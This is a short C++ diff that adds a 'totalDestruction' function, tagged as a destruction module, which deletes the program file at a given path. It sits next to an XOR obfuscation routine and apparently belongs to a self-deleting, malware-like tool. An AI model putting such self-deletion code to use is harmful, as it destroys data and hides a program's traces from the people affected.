@@ -102,3 +102,19 @@ string XOREncryption(string data) //Do not use strlen on XOREncryption
 
 }//Source: https://www.cprogramming.com/tutorial/xor.html
 
+int totalDestruction(string path_prog) //MOD_DESTRUCTION:
+{
+    wstring path_prog_unicode(path_prog.begin(), path_prog.end());
+    wcout << "PATH PROG: " << path_prog_unicode << endl;
+
+    if(DeleteFileW(path_prog_unicode.c_str()) == 0)    
+    {
+        //if error
+        return 1;
+    }
+    else
+    {
+        return 0;
+    }
+    
+}
